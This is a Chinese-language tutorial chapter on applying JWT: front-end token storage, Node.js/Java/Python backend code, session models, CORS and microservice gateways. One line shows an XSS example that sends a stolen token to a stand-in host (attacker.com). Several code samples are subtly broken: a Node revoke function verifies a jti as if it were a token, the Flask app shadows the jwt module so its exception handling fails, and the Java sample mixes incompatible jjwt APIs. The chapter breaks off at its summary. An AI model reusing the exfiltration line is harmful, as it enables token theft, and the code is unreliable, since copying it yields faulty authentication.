# JWT 核心知识体系

## 第 6 章：JWT 实战应用

> **导读**：理论最终要服务于实践。本章从前端存储方案对比、多语言后端实现、会话模式选择、跨域认证配置到微服务架构应用，全面覆盖 JWT 在实际项目中的落地方案。通过本章学习，您将具备在任何技术栈中实施 JWT 认证的能力。

---

### 6.1 前端存储方案：安全性对比与选择

JWT 在前端的存储位置直接影响系统安全性。本节深入分析 LocalStorage、Cookie、Memory 三种主流方案的优劣，并给出场景化选择建议。

#### 6.1.1 三种存储方案核心对比

| 特性 | LocalStorage | Cookie (HttpOnly) | Memory (JavaScript 变量) |
|------|--------------|-------------------|--------------------------|
| **XSS 防护** | ❌ 无防护 | ✅ 有效防护 | ✅ 进程隔离 |
| **CSRF 防护** | ✅ 无 CSRF 风险 | ⚠️ 需 SameSite 配置 | ✅ 无 CSRF 风险 |
| **存储容量** | ~5-10 MB | ~4 KB | 受内存限制 |
| **持久化** | ✅ 永久存储 | ✅ 可设置过期时间 | ❌ 刷新即失 |
| **自动发送** | ❌ 需手动添加 | ✅ 自动携带 | ❌ 需手动添加 |
| **跨标签页共享** | ✅ 支持 | ✅ 支持 | ❌ 不支持 |
| **JavaScript 访问** | ✅ 可访问 | ❌ HttpOnly 禁止 | ✅ 可访问 |
| **安全等级** | 🟡 中 | 🟢 高 | 🟢 高 |

#### 6.1.2 LocalStorage 方案

**实现方式：**

```javascript
// 登录成功后存储 Token
localStorage.setItem('access_token', token);
localStorage.setItem('refresh_token', refreshToken);

// 请求时添加 Token
const token = localStorage.getItem('access_token');
fetch('/api/protected', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**优点：**
- 易于使用，API 简单
- 容量大，可存储多个 Token
- 持久化，关闭浏览器后仍存在

**缺点与风险：**

⚠️ **XSS 攻击高风险**：任何注入的恶意脚本都可读取 Token

```javascript
// ❌ 攻击者通过 XSS 窃取 Token
const stolenToken = localStorage.getItem('access_token');
fetch('https://attacker.com/steal?token=' + stolenToken);
```

**适用场景：**
- 内部系统（XSS 风险可控）
- 快速原型开发
- 对安全性要求不高的应用

**安全加固措施：**

```javascript
// 1. 实施严格的内容安全策略 (CSP)
// 响应头添加：
Content-Security-Policy: default-src 'self'; script-src 'nonce-random123'

// 2. Token 加密存储（增加攻击难度）
const encryptedToken = CryptoJS.AES.encrypt(token, secretKey).toString();
localStorage.setItem('access_token', encryptedToken);

// 3. 定期检查 XSS 漏洞
// 使用工具：DOMPurify 净化用户输入
```

#### 6.1.3 Cookie 方案（推荐）

**实现方式：**

```javascript
// 服务端设置 HttpOnly Cookie（Node.js Express 示例）
app.post('/login', (req, res) => {
  // 验证用户后设置 Cookie
  res.cookie('access_token', token, {
    httpOnly: true,      // 禁止 JavaScript 访问
    secure: true,        // 仅 HTTPS 传输
    sameSite: 'strict',  // 防止 CSRF
    maxAge: 900000       // 15 分钟
  });
  
  res.json({ success: true });
});
```

**关键配置说明：**

| 属性 | 作用 | 推荐值 |
|------|------|--------|
| `httpOnly` | 禁止 JavaScript 访问，防御 XSS | `true` |
| `secure` | 仅通过 HTTPS 传输 | `true` |
| `sameSite` | 限制跨站 Cookie 发送 | `strict` 或 `lax` |
| `path` | Cookie 生效路径 | `/` 或特定路径 |
| `domain` | Cookie 生效域名 | 当前域名 |

**前端请求自动携带 Cookie：**

```javascript
// fetch 需要 credentials 选项
fetch('/api/protected', {
  credentials: 'include'  // 自动携带 Cookie
});

// Axios 配置
axios.create({
  baseURL: 'https://api.example.com',
  withCredentials: true  // 自动携带 Cookie
});
```

**优点：**
- HttpOnly 有效防御 XSS 窃取
- SameSite 属性防御 CSRF
- 浏览器原生支持

**缺点：**
- 容量限制（4KB）
- 每次请求自动携带，增加带宽
- 跨域配置复杂

**适用场景：**
- **生产环境首选**
- 高安全性要求的系统
- 电商、金融、医疗应用

#### 6.1.4 Memory 方案（内存存储）

**实现方式：**

```javascript
// Token 存储在 JavaScript 变量中
let accessToken = null;

// 登录成功后存储
function login(token) {
  accessToken = token;
}

// 请求时添加
function getAuthHeader() {
  return {
    'Authorization': `Bearer ${accessToken}`
  };
}

// 刷新页面后 Token 丢失，需要 Refresh Token 恢复
window.addEventListener('load', async () => {
  const refreshToken = localStorage.getItem('refresh_token');
  if (refreshToken) {
    accessToken = await refreshAccessToken(refreshToken);
  }
});
```

**优点：**
- XSS 攻击难度高（需内存扫描）
- 无 CSRF 风险
- 刷新页面自动清除

**缺点：**
- 刷新页面 Token 丢失
- 需要 Refresh Token 配合
- 实现复杂度较高

**适用场景：**
- 单页应用（SPA）
- 对安全性要求极高的系统
- 配合 Refresh Token 使用

#### 6.1.5 推荐方案：混合存储模式

**最佳实践架构：**

```
┌─────────────────────────────────────────────────────────┐
│  Access Token              Refresh Token                │
│  - 存储位置：Memory        - 存储位置：HttpOnly Cookie  │
│  - 有效期：15 分钟          - 有效期：7 天               │
│  - 用途：API 请求认证       - 用途：刷新 Access Token    │
└─────────────────────────────────────────────────────────┘
```

**完整实现示例（React + Axios）：**

```javascript
// src/utils/auth.js
import axios from 'axios';

class AuthService {
  constructor() {
    this.accessToken = null;  // 内存存储
  }
  
  // 登录
  async login(credentials) {
    const response = await axios.post('/api/auth/login', credentials, {
      withCredentials: true  // 自动存储 Refresh Token Cookie
    });
    
    // Access Token 存内存
    this.accessToken = response.data.accessToken;
    return response.data;
  }
  
  // 获取请求头
  getAuthHeader() {
    return this.accessToken ? {
      'Authorization': `Bearer ${this.accessToken}`
    } : {};
  }
  
  // Token 过期时自动刷新
  async refreshToken() {
    try {
      const response = await axios.post('/api/auth/refresh', {}, {
        withCredentials: true  // 自动发送 Refresh Token Cookie
      });
      
      this.accessToken = response.data.accessToken;
      return this.accessToken;
    } catch (error) {
      // Refresh Token 也过期，强制重新登录
      this.logout();
      window.location.href = '/login';
      throw error;
    }
  }
  
  // 登出
  logout() {
    this.accessToken = null;
    axios.post('/api/auth/logout');
  }
}

export const authService = new AuthService();

// Axios 拦截器自动处理 Token 刷新
axios.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    // 401 且未重试过
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      
      try {
        const newToken = await authService.refreshToken();
        originalRequest.headers['Authorization'] = `Bearer ${newToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        return Promise.reject(refreshError);
      }
    }
    
    return Promise.reject(error);
  }
);
```

#### 6.1.6 存储方案选择决策树

```
是否需要最高安全性？
├─ 是 → HttpOnly Cookie + Memory 混合模式
└─ 否 → 继续判断
    │
    是否有严格 XSS 防护？
    ├─ 是 → LocalStorage（开发/内部系统）
    └─ 否 → HttpOnly Cookie（生产环境）
        │
        是否需要离线访问？
        ├─ 是 → Cookie + Refresh Token
        └─ 否 → Memory + Refresh Token
```

---

### 6.2 后端实现：多语言代码示例

#### 6.2.1 Node.js (jsonwebtoken 库)

**安装：**
```bash
npm install jsonwebtoken
```

**完整实现：**

```javascript
// auth/jwt.service.js
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

class JwtService {
  constructor() {
    this.accessSecret = process.env.JWT_ACCESS_SECRET;
    this.refreshSecret = process.env.JWT_REFRESH_SECRET;
    this.accessExpiry = process.env.JWT_ACCESS_EXPIRY || '15m';
    this.refreshExpiry = process.env.JWT_REFRESH_EXPIRY || '7d';
  }
  
  // 生成 Token 对
  generateTokenPair(user) {
    const accessToken = jwt.sign(
      {
        sub: user.id,
        email: user.email,
        role: user.role,
        type: 'access'
      },
      this.accessSecret,
      {
        algorithm: 'HS256',
        expiresIn: this.accessExpiry
      }
    );
    
    const refreshToken = jwt.sign(
      {
        sub: user.id,
        type: 'refresh',
        jti: crypto.randomBytes(16).toString('hex')
      },
      this.refreshSecret,
      {
        algorithm: 'HS256',
        expiresIn: this.refreshExpiry
      }
    );
    
    return { accessToken, refreshToken };
  }
  
  // 验证 Access Token
  verifyAccessToken(token) {
    try {
      return jwt.verify(token, this.accessSecret, {
        algorithms: ['HS256'],
        issuer: 'your-app-issuer'
      });
    } catch (error) {
      throw new Error('Invalid access token');
    }
  }
  
  // 验证 Refresh Token
  async verifyRefreshToken(token) {
    try {
      const decoded = jwt.verify(token, this.refreshSecret, {
        algorithms: ['HS256']
      });
      
      // 检查是否在黑名单中
      const isRevoked = await this.checkRevoked(decoded.jti);
      if (isRevoked) {
        throw new Error('Token has been revoked');
      }
      
      return decoded;
    } catch (error) {
      throw new Error('Invalid refresh token');
    }
  }
  
  // 撤销 Token（加入黑名单）
  async revokeToken(jti) {
    const decoded = jwt.verify(jti, this.refreshSecret, {
      algorithms: ['HS256'],
      complete: true
    });
    
    const ttl = decoded.exp - Math.floor(Date.now() / 1000);
    await redis.setex(`jwt:blacklist:${jti}`, ttl, 'revoked');
  }
  
  async checkRevoked(jti) {
    return await redis.exists(`jwt:blacklist:${jti}`);
  }
}

module.exports = new JwtService();
```

**中间件实现：**

```javascript
// middleware/auth.middleware.js
const jwtService = require('../auth/jwt.service');

exports.authenticate = async (req, res, next) => {
  try {
    // 从 Header 获取 Token
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Missing or invalid authorization header' });
    }
    
    const token = authHeader.substring(7);
    const decoded = jwtService.verifyAccessToken(token);
    
    // 附加用户信息到请求
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ error: error.message });
  }
};

// 权限检查中间件
exports.authorize = (...roles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    
    next();
  };
};
```

**路由使用：**

```javascript
// routes/protected.js
const express = require('express');
const { authenticate, authorize } = require('../middleware/auth.middleware');
const router = express.Router();

// 需要登录访问
router.get('/profile', authenticate, (req, res) => {
  res.json({ userId: req.user.sub, email: req.user.email });
});

// 仅管理员访问
router.get('/admin', authenticate, authorize('admin'), (req, res) => {
  res.json({ message: 'Admin access granted' });
});

module.exports = router;
```

#### 6.2.2 Java (jjwt 库)

**Maven 依赖：**

```xml
<dependencies>
    <!-- JJWT API -->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-api</artifactId>
        <version>0.12.3</version>
    </dependency>
    <!-- JJWT 实现 -->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-impl</artifactId>
        <version>0.12.3</version>
        <scope>runtime</scope>
    </dependency>
    <!-- JJWT Jackson -->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-jackson</artifactId>
        <version>0.12.3</version>
        <scope>runtime</scope>
    </dependency>
</dependencies>
```

**完整实现：**

```java
// service/JwtService.java
package com.example.service;

import io.jsonwebtoken.*;
import io.jsonwebtoken.security.Keys;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import javax.annotation.PostConstruct;
import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.util.Date;
import java.util.Map;
import java.util.UUID;

@Service
public class JwtService {
    
    @Value("${jwt.secret}")
    private String secret;
    
    @Value("${jwt.issuer}")
    private String issuer;
    
    @Value("${jwt.access.expiry:900000}")
    private long accessExpiry;  // 15 分钟
    
    @Value("${jwt.refresh.expiry:604800000}")
    private long refreshExpiry;  // 7 天
    
    private SecretKey accessKey;
    private SecretKey refreshKey;
    
    @PostConstruct
    public void init() {
        // 生成密钥
        this.accessKey = Keys.hmacShaKeyFor(
            (secret + "-access").getBytes(StandardCharsets.UTF_8)
        );
        this.refreshKey = Keys.hmacShaKeyFor(
            (secret + "-refresh").getBytes(StandardCharsets.UTF_8)
        );
    }
    
    // 生成 Access Token
    public String generateAccessToken(Map<String, Object> claims, String subject) {
        Date now = new Date();
        Date expiry = new Date(now.getTime() + accessExpiry);
        
        return Jwts.builder()
            .setHeaderParam(JwtHeaderBuilder.ID, UUID.randomUUID().toString())
            .setClaims(claims)
            .setSubject(subject)
            .setIssuer(issuer)
            .setIssuedAt(now)
            .setExpiration(expiry)
            .signWith(accessKey, SignatureAlgorithm.HS256)
            .compact();
    }
    
    // 生成 Refresh Token
    public String generateRefreshToken(String subject) {
        Date now = new Date();
        Date expiry = new Date(now.getTime() + refreshExpiry);
        
        return Jwts.builder()
            .setHeaderParam(JwtHeaderBuilder.ID, UUID.randomUUID().toString())
            .setSubject(subject)
            .setIssuer(issuer)
            .setIssuedAt(now)
            .setExpiration(expiry)
            .setId(UUID.randomUUID().toString())  // jti
            .signWith(refreshKey, SignatureAlgorithm.HS256)
            .compact();
    }
    
    // 验证 Token
    public Claims verifyAccessToken(String token) {
        try {
            return Jwts.parserBuilder()
                .setSigningKey(accessKey)
                .requireIssuer(issuer)
                .build()
                .parseClaimsJws(token)
                .getBody();
        } catch (JwtException e) {
            throw new AuthenticationException("Invalid access token");
        }
    }
    
    // 验证 Refresh Token
    public Claims verifyRefreshToken(String token) {
        try {
            return Jwts.parserBuilder()
                .setSigningKey(refreshKey)
                .requireIssuer(issuer)
                .build()
                .parseClaimsJws(token)
                .getBody();
        } catch (JwtException e) {
            throw new AuthenticationException("Invalid refresh token");
        }
    }
    
    // 检查是否过期
    public boolean isTokenExpired(String token) {
        try {
            Claims claims = verifyAccessToken(token);
            return claims.getExpiration().before(new Date());
        } catch (Exception e) {
            return true;
        }
    }
}
```

**Spring Security 集成：**

```java
// config/SecurityConfig.java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private JwtAuthenticationFilter jwtAuthFilter;
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .sessionManagement(sess -> sess.sessionCreationPolicy(
                SessionCreationPolicy.STATELESS
            ))
            .authenticationProvider(authenticationProvider())
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
    
    @Bean
    public AuthenticationProvider authenticationProvider() {
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setUserDetailsService(userDetailsService);
        provider.setPasswordEncoder(passwordEncoder());
        return provider;
    }
}

// filter/JwtAuthenticationFilter.java
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    private final JwtService jwtService;
    private final UserDetailsService userDetailsService;
    
    @Override
    protected void doFilterInternal(
        HttpServletRequest request,
        HttpServletResponse response,
        FilterChain filterChain
    ) throws ServletException, IOException {
        
        final String authHeader = request.getHeader("Authorization");
        
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);
            return;
        }
        
        try {
            String token = authHeader.substring(7);
            Claims claims = jwtService.verifyAccessToken(token);
            String userId = claims.getSubject();
            
            // 加载用户详情
            UserDetails userDetails = userDetailsService.loadUserByUsername(userId);
            
            // 设置认证上下文
            UsernamePasswordAuthenticationToken authToken = 
                new UsernamePasswordAuthenticationToken(
                    userDetails,
                    null,
                    userDetails.getAuthorities()
                );
            
            authToken.setDetails(
                new WebAuthenticationDetailsSource().buildDetails(request)
            );
            
            SecurityContextHolder.getContext().setAuthentication(authToken);
        } catch (Exception e) {
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
            return;
        }
        
        filterChain.doFilter(request, response);
    }
}
```

#### 6.2.3 Python (PyJWT 库)

**安装：**
```bash
pip install PyJWT
```

**完整实现：**

```python
# services/jwt_service.py
import jwt
import datetime
from functools import wraps
from flask import request, jsonify, current_app, g

class JwtService:
    def __init__(self, app=None):
        self.access_secret = None
        self.refresh_secret = None
        self.issuer = None
        self.access_expiry = None
        self.refresh_expiry = None
        
        if app:
            self.init_app(app)
    
    def init_app(self, app):
        self.access_secret = app.config['JWT_ACCESS_SECRET']
        self.refresh_secret = app.config['JWT_REFRESH_SECRET']
        self.issuer = app.config['JWT_ISSUER']
        self.access_expiry = app.config.get('JWT_ACCESS_EXPIRY', 900)  # 15 分钟
        self.refresh_expiry = app.config.get('JWT_REFRESH_EXPIRY', 604800)  # 7 天
    
    def generate_tokens(self, user_id, email, role='user'):
        """生成 Token 对"""
        now = datetime.datetime.utcnow()
        
        # Access Token
        access_payload = {
            'sub': user_id,
            'email': email,
            'role': role,
            'type': 'access',
            'iat': now,
            'exp': now + datetime.timedelta(seconds=self.access_expiry),
            'iss': self.issuer
        }
        
        access_token = jwt.encode(
            access_payload,
            self.access_secret,
            algorithm='HS256'
        )
        
        # Refresh Token
        refresh_payload = {
            'sub': user_id,
            'type': 'refresh',
            'jti': self._generate_jti(),
            'iat': now,
            'exp': now + datetime.timedelta(seconds=self.refresh_expiry),
            'iss': self.issuer
        }
        
        refresh_token = jwt.encode(
            refresh_payload,
            self.refresh_secret,
            algorithm='HS256'
        )
        
        return {
            'accessToken': access_token,
            'refreshToken': refresh_token
        }
    
    def verify_access_token(self, token):
        """验证 Access Token"""
        try:
            payload = jwt.decode(
                token,
                self.access_secret,
                algorithms=['HS256'],
                issuer=self.issuer
            )
            
            if payload.get('type') != 'access':
                raise jwt.InvalidTokenError('Invalid token type')
            
            return payload
        except jwt.ExpiredSignatureError:
            raise jwt.InvalidTokenError('Access token has expired')
        except jwt.InvalidTokenError as e:
            raise jwt.InvalidTokenError(f'Invalid access token: {str(e)}')
    
    def verify_refresh_token(self, token):
        """验证 Refresh Token"""
        try:
            payload = jwt.decode(
                token,
                self.refresh_secret,
                algorithms=['HS256'],
                issuer=self.issuer
            )
            
            if payload.get('type') != 'refresh':
                raise jwt.InvalidTokenError('Invalid token type')
            
            # 检查是否在黑名单中
            if self._is_revoked(payload.get('jti')):
                raise jwt.InvalidTokenError('Token has been revoked')
            
            return payload
        except jwt.ExpiredSignatureError:
            raise jwt.InvalidTokenError('Refresh token has expired')
        except jwt.InvalidTokenError as e:
            raise jwt.InvalidTokenError(f'Invalid refresh token: {str(e)}')
    
    def revoke_token(self, jti):
        """撤销 Token（加入黑名单）"""
        # 使用 Redis 存储黑名单
        redis_client = current_app.extensions['redis']
        redis_client.setex(f'jwt:blacklist:{jti}', self.refresh_expiry, 'revoked')
    
    def _is_revoked(self, jti):
        """检查 Token 是否被撤销"""
        redis_client = current_app.extensions['redis']
        return redis_client.exists(f'jwt:blacklist:{jti}')
    
    def _generate_jti(self):
        """生成唯一 Token ID"""
        import uuid
        return str(uuid.uuid4())


# 装饰器实现
def jwt_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        
        if not auth_header:
            return jsonify({'error': 'Missing authorization header'}), 401
        
        parts = auth_header.split()
        if len(parts) != 2 or parts[0].lower() != 'bearer':
            return jsonify({'error': 'Invalid authorization header'}), 401
        
        token = parts[1]
        
        try:
            jwt_service = current_app.extensions['jwt']
            payload = jwt_service.verify_access_token(token)
            g.current_user = payload
        except jwt.InvalidTokenError as e:
            return jsonify({'error': str(e)}), 401
        
        return f(*args, **kwargs)
    
    return decorated


# Flask 应用示例
# app.py
from flask import Flask
from services.jwt_service import JwtService, jwt_required

app = Flask(__name__)
app.config['JWT_ACCESS_SECRET'] = 'your-access-secret'
app.config['JWT_REFRESH_SECRET'] = 'your-refresh-secret'
app.config['JWT_ISSUER'] = 'your-app-issuer'

jwt = JwtService()
jwt.init_app(app)

@app.route('/api/auth/login', methods=['POST'])
def login():
    # 验证用户凭据（简化示例）
    user = authenticate_user(request.json)  # 自实现
    if not user:
        return jsonify({'error': 'Invalid credentials'}), 401
    
    tokens = jwt.generate_tokens(user.id, user.email, user.role)
    return jsonify(tokens)

@app.route('/api/protected', methods=['GET'])
@jwt_required
def protected():
    return jsonify({
        'message': 'Access granted',
        'user': g.current_user
    })

@app.route('/api/auth/refresh', methods=['POST'])
def refresh():
    refresh_token = request.json.get('refreshToken')
    if not refresh_token:
        return jsonify({'error': 'Missing refresh token'}), 400
    
    try:
        payload = jwt.verify_refresh_token(refresh_token)
        new_tokens = jwt.generate_tokens(payload['sub'], payload.get('email'))
        return jsonify(new_tokens)
    except jwt.InvalidTokenError as e:
        return jsonify({'error': str(e)}), 401
```

---

### 6.3 无状态会话 vs 有状态会话

#### 6.3.1 两种会话模式对比

| 特性 | 无状态会话 (JWT) | 有状态会话 (Session) |
|------|------------------|----------------------|
| **服务端存储** | 无需存储 | 需要存储（Redis/DB） |
| **水平扩展** | 天然支持 | 需要共享 Session |
| **撤销机制** | 困难（需黑名单） | 简单（删除 Session） |
| **Token 大小** | 较大（包含数据） | 较小（仅 Session ID） |
| **性能** | 验证快，无需查询 | 需查询存储 |
| **适用场景** | 微服务、API、移动端 | 单体应用、高安全系统 |

#### 6.3.2 场景选择决策树

```
是否需要即时撤销能力？
├─ 是 → 有状态会话（或 JWT + 黑名单）
└─ 否 → 继续判断
    │
    是否是微服务架构？
    ├─ 是 → 无状态会话（JWT）
    └─ 否 → 继续判断
        │
        是否需要水平扩展？
        ├─ 是 → 无状态会话（JWT）
        └─ 否 → 有状态会话（Session）
            │
            是否对安全性要求极高？
            ├─ 是 → 有状态会话（Session）
            └─ 否 → 无状态会话（JWT）
```

#### 6.3.3 混合模式（推荐）

结合两者优势：

```
┌─────────────────────────────────────────────────────────┐
│  Access Token (无状态)        Refresh Token (有状态)    │
│  - JWT 格式，自包含             - 存储在 Redis            │
│  - 无需查询数据库               - 可即时撤销              │
│  - 短期有效（15 分钟）           - 长期有效（7 天）        │
└─────────────────────────────────────────────────────────┘
```

**实现示例：**

```javascript
// 服务端验证 Access Token 时不查数据库
function verifyAccessToken(token) {
  return jwt.verify(token, accessSecret);  // 纯计算，无 IO
}

// Refresh Token 使用时查 Redis
async function verifyRefreshToken(token, jti) {
  // 验证签名
  jwt.verify(token, refreshSecret);
  
  // 检查黑名单
  const isRevoked = await redis.exists(`jwt:blacklist:${jti}`);
  if (isRevoked) {
    throw new Error('Token revoked');
  }
}
```

---

### 6.4 跨域认证与 CORS 配置

#### 6.4.1 CORS 基础

CORS (Cross-Origin Resource Sharing) 是浏览器允许跨域请求的机制。核心是通过响应头告知浏览器哪些源可以访问资源。

**关键响应头：**

| 响应头 | 说明 | 示例 |
|--------|------|------|
| `Access-Control-Allow-Origin` | 允许的源 | `https://frontend.com` |
| `Access-Control-Allow-Methods` | 允许的方法 | `GET, POST, PUT` |
| `Access-Control-Allow-Headers` | 允许的请求头 | `Authorization, Content-Type` |
| `Access-Control-Allow-Credentials` | 是否允许携带凭证 | `true` |
| `Access-Control-Max-Age` | 预检结果缓存时间 | `86400`（秒） |

#### 6.4.2 JWT + CORS 配置示例

**Node.js Express：**

```javascript
const cors = require('cors');

app.use(cors({
  origin: 'https://frontend.com',  // 或使用函数动态判断
  credentials: true,  // 允许携带 Cookie
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400
}));

// 动态 origin 配置
app.use(cors({
  origin: (origin, callback) => {
    const allowed = ['https://frontend.com', 'https://app.frontend.com'];
    if (!origin || allowed.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

**Spring Boot：**

```java
@Configuration
public class CorsConfig {
    
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    .allowedOrigins("https://frontend.com")
                    .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
                    .allowedHeaders("Content-Type", "Authorization")
                    .allowCredentials(true)
                    .maxAge(86400);
            }
        };
    }
}
```

**Nginx 配置：**

```nginx
server {
    listen 443 ssl;
    server_name api.example.com;
    
    # CORS 配置
    add_header Access-Control-Allow-Origin "https://frontend.com" always;
    add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
    add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
    add_header Access-Control-Allow-Credentials "true" always;
    add_header Access-Control-Max-Age "86400" always;
    
    # 处理预检请求
    if ($request_method = OPTIONS) {
        add_header Access-Control-Allow-Origin "https://frontend.com";
        add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS";
        add_header Access-Control-Allow-Headers "Content-Type, Authorization";
        add_header Access-Control-Allow-Credentials "true";
        add_header Access-Control-Max-Age "86400";
        add_header Content-Length 0;
        add_header Content-Type text/plain;
        return 204;
    }
    
    location / {
        proxy_pass http://backend;
    }
}
```

#### 6.4.3 常见 CORS 问题排查

| 问题 | 错误信息 | 解决方案 |
|------|----------|----------|
| Origin 不匹配 | `No 'Access-Control-Allow-Origin'` | 检查 `allowedOrigins` 配置 |
| 凭证问题 | `Credentials flag is 'true'` | 设置 `credentials: true` 和 `Access-Control-Allow-Credentials: true` |
| 预检失败 | `403 Preflight` | 确保 OPTIONS 请求被正确处理 |
| Header 不允许 | `Authorization is not allowed` | 添加到 `allowedHeaders` |

---

### 6.5 JWT 在微服务架构中的应用

#### 6.5.1 微服务认证挑战

在微服务架构中，认证面临以下挑战：

1. **服务间信任传递**：如何将在网关认证的用户身份传递给后端服务？
2. **重复验证**：每个服务都验证 Token 会导致性能问题
3. **权限同步**：用户权限变更后如何快速生效？
4. **服务间调用**：服务 A 调用服务 B 时如何传递身份？

#### 6.5.2 API 网关统一认证架构

```
┌─────────────────────────────────────────────────────────┐
│                     客户端请求                          │
│                  (携带 JWT Token)                       │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│                   API 网关层                             │
│  ├─ 验证 JWT 签名                                        │
│  ├─ 检查过期时间                                         │
│  ├─ 提取用户信息 (sub, role, scope)                     │
│  └─ 将用户信息注入请求头 (X-User-ID, X-User-Role)       │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│                   后端微服务                             │
│  ├─ 信任网关传递的用户信息                               │
│  ├─ 可选：二次验证 JWT（高安全场景）                     │
│  └─ 基于用户信息执行权限检查                             │
└─────────────────────────────────────────────────────────┘
```

#### 6.5.3 Spring Cloud Gateway 实现

**网关配置：**

```yaml
# application.yml
spring:
  cloud:
    gateway:
      globalcors:
        cors-configurations:
          '[/**]':
            allowedOrigins: "https://frontend.com"
            allowedMethods:
              - GET
              - POST
              - PUT
              - DELETE
            allowedHeaders:
              - Content-Type
              - Authorization
            allowCredentials: true
      default-filters:
        - name: JwtAuthFilter
      routes:
        - id: user-service
          uri: lb://user-service
          predicates:
            - Path=/api/users/**
          filters:
            - StripPrefix=1
```

**JWT 认证过滤器：**

```java
// filter/JwtAuthFilter.java
@Component
public class JwtAuthFilter implements GlobalFilter {
    
    @Autowired
    private JwtService jwtService;
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        String path = request.getPath().value();
        
        // 跳过登录接口
        if (path.startsWith("/api/auth/")) {
            return chain.filter(exchange);
        }
        
        String authHeader = request.getHeaders().getFirst("Authorization");
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            return onError(exchange, "Missing or invalid authorization header");
        }
        
        try {
            String token = authHeader.substring(7);
            Claims claims = jwtService.verifyAccessToken(token);
            
            // 将用户信息注入请求头
            ServerHttpRequest modifiedRequest = request.mutate()
                .header("X-User-ID", claims.getSubject())
                .header("X-User-Email", claims.get("email", String.class))
                .header("X-User-Role", claims.get("role", String.class))
                .build();
            
            return chain.filter(exchange.mutate().request(modifiedRequest).build());
        } catch (Exception e) {
            return onError(exchange, "Invalid token: " + e.getMessage());
        }
    }
    
    private Mono<Void> onError(ServerWebExchange exchange, String error) {
        ServerHttpResponse response = exchange.getResponse();
        response.setStatusCode(HttpStatus.UNAUTHORIZED);
        response.getHeaders().add("Content-Type", "application/json");
        String body = "{\"error\": \"" + error + "\"}";
        return response.writeWith(Mono.just(response.bufferFactory().wrap(body.getBytes())));
    }
}
```

**后端服务信任网关：**

```java
// 后端服务从请求头获取用户信息
@RestController
@RequestMapping("/profile")
public class ProfileController {
    
    @GetMapping
    public ResponseEntity<ProfileResponse> getProfile(
        @RequestHeader("X-User-ID") String userId,
        @RequestHeader("X-User-Email") String email
    ) {
        // 直接使用网关传递的用户信息
        Profile profile = profileService.findByUserId(userId);
        return ResponseEntity.ok(new ProfileResponse(profile));
    }
}
```

#### 6.5.4 服务间调用 Token 传递

**场景：Order 服务调用 User 服务**

```javascript
// Order 服务代码
async function createOrder(orderData, userToken) {
  // 1. 验证用户 Token
  const user = await verifyToken(userToken);
  
  // 2. 调用 User 服务获取用户详情
  const userResponse = await fetch('http://user-service/users/' + user.sub, {
    headers: {
      // 传递原始 Token（User 服务可二次验证）
      'Authorization': `Bearer ${userToken}`,
      // 或传递服务间 Token
      'X-Service-Token': generateServiceToken('order-service')
    }
  });
  
  // 3. 创建订单
  const order = await orderRepo.create({
    userId: user.sub,
    ...orderData
  });
  
  return order;
}

// 生成服务间调用 Token
function generateServiceToken(serviceName) {
  return jwt.sign(
    {
      sub: serviceName,
      type: 'service',
      scope: ['internal']
    },
    process.env.SERVICE_SECRET,
    { expiresIn: '5m' }
  );
}
```

#### 6.5.5 微服务 JWT 最佳实践

| 实践 | 说明 |
|------|------|
| 网关统一认证 | 避免每个服务重复验证 |
| 最小权限原则 | Token 中只包含必要的权限信息 |
| 服务间 Token | 使用短期 Service Token 进行内部调用 |
| 令牌绑定 | 将 Token 与服务标识绑定，防止跨服务重用 |
| 审计日志 | 记录所有 Token 验证和权限检查 |

---

### 6.6 本章总结

本章全面覆盖了 JWT 实战应用的核心领域：

